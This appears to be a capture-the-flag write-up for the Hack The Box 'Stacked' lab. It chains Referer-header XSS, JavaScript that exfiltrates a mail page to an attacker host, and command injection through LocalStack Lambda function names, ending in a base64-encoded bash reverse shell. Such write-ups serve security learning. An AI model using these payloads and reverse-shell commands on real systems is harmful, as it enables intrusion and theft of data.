## `http://portfolio.stacked.htb`

This site describes the project portfolio of STACKED.HTB, a software development organization. Much of their projects involve using [LocalStack](https://localstack.cloud/) Docker containers to mock a local AWS environment.

### Content Discovery

```bash
$  feroxbuster -u http://portfolio.stacked.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portfolio.stacked.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      330c http://portfolio.stacked.htb/files => http://portfolio.stacked.htb/files/
301      GET        9l       28w      331c http://portfolio.stacked.htb/assets => http://portfolio.stacked.htb/assets/
301      GET        9l       28w      328c http://portfolio.stacked.htb/css => http://portfolio.stacked.htb/css/
301      GET        9l       28w      327c http://portfolio.stacked.htb/js => http://portfolio.stacked.htb/js/
301      GET        9l       28w      335c http://portfolio.stacked.htb/assets/img => http://portfolio.stacked.htb/assets/img/
301      GET        9l       28w      345c http://portfolio.stacked.htb/assets/img/portfolio => http://portfolio.stacked.htb/assets/img/portfolio/
403      GET        9l       28w      286c http://portfolio.stacked.htb/server-status
[####################] - 2m    209993/209993  0s      found:7       errors:1608
[####################] - 2m     29999/29999   244/s   http://portfolio.stacked.htb
[####################] - 2m     29999/29999   248/s   http://portfolio.stacked.htb/files
[####################] - 2m     29999/29999   242/s   http://portfolio.stacked.htb/assets
[####################] - 2m     29999/29999   245/s   http://portfolio.stacked.htb/css
[####################] - 2m     29999/29999   252/s   http://portfolio.stacked.htb/js
[####################] - 1m     29999/29999   254/s   http://portfolio.stacked.htb/assets/img
[####################] - 1m     29999/29999   255/s   http://portfolio.stacked.htb/assets/img/portfolio
```

### Virtual Host Discovery

All virtual hosts return 302s.

```bash
$ gobuster vhost -u http://portfolio.stacked.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt > vhosts.txt
$ python3 gobuster-vhost-to-json.py --file vhosts.txt | jq '.[] | select(.status != 302)'
```

### `docker-compose.yml`

The site contains a link to a `docker-compose.yml` file which describes one of their LocalStack testing environments.

The `SERVICES` option is set to `serverless`, indicating it is only mocking up AWS Lambda.

Through LocalStack, the AWS Elasticsearch typically runs on `localhost`:4571.

LocalStack version is 0.12.6, which has [several critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack).

```yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
```

### Contact Form XSS

The page also contains a contact form. When submitted, it results in an HTTP `POST` request to `/process.php`.

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 111
Origin: http://portfolio.stacked.htb
Connection: close
Referer: http://portfolio.stacked.htb/

fullname=tgihf+full+name&email=tgihf%40stacked.htb&tel=111111111111&subject=tgihf+subject&message=tgihf+message
```

```http
HTTP/1.1 200 OK
Date: Sat, 19 Mar 2022 21:15:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 54
Connection: close
Content-Type: text/json; charset=utf8

{"success":"Your form has been submitted. Thank you!"}
```

The data on this form is presumably rendered in whoever looks through the submission's browser. Thus, it may be vulnerable to XSS.

The backend is filtering XSS attempts on the form data effectively. However, it doesn't appear to be applying that filter to the request headers. The `Referer` header must also be rendered to the user, as injecting it with an XSS payload that contains a link to an attacker-controlled web server seems to trigger a request.

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: <img src="http://10.10.14.61/ua">
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 258
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <img src="http://10.10.14.61/referer">

fullname=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fname%3E%3C%2Fimg%3E&email=tgihf%40stacked.htb&tel=111111111111&subject=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fsubject%3E%3C%2Fimg%3E&message=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fmsg%3E%3C%2Fimg%3E
```

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.140.39 - - [19/Mar/2022 18:10:41] code 404, message File not found
10.129.140.39 - - [19/Mar/2022 18:10:41] "GET /referer HTTP/1.1" 404 -
```

Fingerprinting the XSS victim's browser:

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
```

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script src="http://10.10.14.61/tgihf.js"></script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

Its `User-Agent` indicates it is Firefox. It was referred by `http://mail.stacked.htb/read-mail.php?id=2`.

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 39598
GET /tgihf.js HTTP/1.1
Host: 10.10.14.61
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
```

### Enumeration of `http://mail.stacked.htb`

Leverage the XSS opportunity to have the user retrieve the home page of `http://mail.stacked.htb` and send it to an attacker-controlled endpoint. This will only work if `http://mail.stacked.htb` has an insecure CORS configuration (is this true though since the initial script is initially ran on the `http://mail.stacked.htb` origin?)

Serve `tgihf.js`:

```javascript
let target = "http://mail.stacked.htb";
fetch(target).then(response => {
   response.text().then(data => {
      const home = "http://10.10.14.61:8000";
      fetch(home, {
         method: "POST",
         body: data
      })
   })
})
```

Start a `netcat` listener to write the `http://mail.stacked.htb` response body into a file:

```bash
$ nc -nlvp 8000 > index.html
listening on [any] 8000 ...
```

The XSS payload:

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script src="http://10.10.14.61/tgihf.js"></script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

```bash
$ nc -nlvp 8000 > index.html
listening on [any] 8000 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 56160
```

The HTML source of `http://mail.stacked.htb` indicates it is the index page of an [AdminLTE 3](https://github.com/ColorlibHQ/AdminLTE) instance belonging to Adam Perkins. Adam's mailbox shows two email messages, one from Jeremy Taint (subject: "S3 Instance Started") and one from the attacker.

Jeremy's message is readable at `http://mail.stacked.htb/read-mail.php?id=1`. Modify and rerun the above exploit to retrieve this URL.

The message:

```html
...
<p>
	Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.
</p>
...
```

So there is an "S3 instance" on `s3-testing.stacked.htb`. The message also mentions configuring IAM users, roles, and permissions on it, as well as it having a "serverless instance" configured. It seems this URL is hosting the LocalStack AWS API endpoint. Confirm this is so by using `aws-cli` to query the Lambda functions.

Though there are no functions configured, the fact that this didn't error out indicates the above hypothesis is true. This is the LocalStack AWS API endpoint.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda list-functions
{
    "Functions": []
}
```

One of the [critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack) in LocalStack 12.0.6 is in the way its dashboard retrieves the configured Lambda functions. When the dashboard is retrieved, the `POST /lambda/$FUNCTION_NAME/code` LocalStack endpoint is queried. Soon thereafter, `$FUNCTION_NAME` is passed to a shell command unsanitized. Thus, by configuring a Lambda function with an injected shell command as its name and causing the user to browse to the LocalStack dashboard (`http://localhost:8080`, according to the `docker-compose.yml` file), the injected shell command will be executed.

Start by creating a generic execution policy for the Lambda function to run under.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb iam create-role --role-name lambda-ex --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{ "Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
{
    "Role": {
        "Path": "/",
        "RoleName": "lambda-ex",
        "RoleId": "dqtj2ss366knjvnqedgx",
        "Arn": "arn:aws:iam::000000000000:role/lambda-ex",
        "CreateDate": "2022-03-20T06:20:02.695000+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "MaxSessionDuration": 3600
    }
}
```

Create a Node.js Lambda function whose name contains the injected command `wget 10.10.14.61`. If the attacker's web server receives a request, command injection is confirmed.

```javascript
// index.js
exports.handler = async function(event, context) {
  console.log("ENVIRONMENT VARIABLES\n" + JSON.stringify(process.env, null, 2))
  console.log("EVENT\n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
```

```bash
$ zip function.zip index.js
  adding: index.js (deflated 30%)
```

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda create-function --function-name 'tgihf;wget 10.10.14.61' --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x --role lambda-ex
{
    "FunctionName": "tgihf;wget 10.10.14.61/blah",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tgihf;wget 10.10.14.61/blah",
    "Runtime": "nodejs12.x",
    "Role": "lambda-ex",
    "Handler": "index.handler",
    "CodeSize": 317,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-20T06:23:29.563+0000",
    "CodeSha256": "8nUEIrrafkyKgs2i/sh63Fevj2kYkbIyFPFI5M0o6Dk=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "66682858-7882-4004-bce2-0d7fa504eae2",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location = "http://127.0.0.1:8080"</script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 33414
GET / HTTP/1.1
Host: 10.10.14.61
User-Agent: Wget
Connection: close
```

Command injection is confirmed. Create a base64-encoded reverse shell command. Create a new Lambda function whose name injects the base64-encoded reverse shell command. Trigger the CSRF and execution of the command to receive a reverse shell.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ echo -n 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==
```

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda create-function --function-name 'tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash' --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x --role lambda-ex
{
    "FunctionName": "tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash",
    "Runtime": "nodejs12.x",
    "Role": "lambda-ex",
    "Handler": "index.handler",
    "CodeSize": 317,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-20T06:46:27.984+0000",
    "CodeSha256": "8nUEIrrafkyKgs2i/sh63Fevj2kYkbIyFPFI5M0o6Dk=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "9730a66c-700a-4579-abbd-98b63effa15c",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

```bash
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location = "http://127.0.0.1:8080"</script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

Grab the user flag at `/home/localstack/user.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 40372
bash: cannot set terminal process group (20): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ id
id
uid=1001(localstack) gid=1001(localstack) groups=1001(localstack)
bash-5.0$ ls -la /home/localstack/user.txt
ls -la /home/localstack/user.txt
-r--r-----    1 root     localsta        33 Jul 12  2021 /home/localstack/user.txt
```
